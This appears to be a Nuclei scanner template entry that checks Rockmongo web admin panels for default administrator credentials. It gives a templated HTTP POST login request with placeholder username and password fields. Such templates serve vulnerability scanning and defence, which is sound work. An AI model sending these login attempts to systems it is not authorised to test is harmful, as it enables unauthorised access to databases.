# Nuclei Template: Rockmongo Default Login
**Template ID:** rockmongo-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`rockmongo-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Rockmongo default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /index.php?action=login.index HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{Hostname}}/index.php?action=login.index

more=0&host=0&username={{username}}&password={{password}}&db=&lang=en_us&expire=3
```

## References
- https://serverfault.com/questions/331315/how-to-change-the-default-admin-username-and-admin-password-in-rockmongo
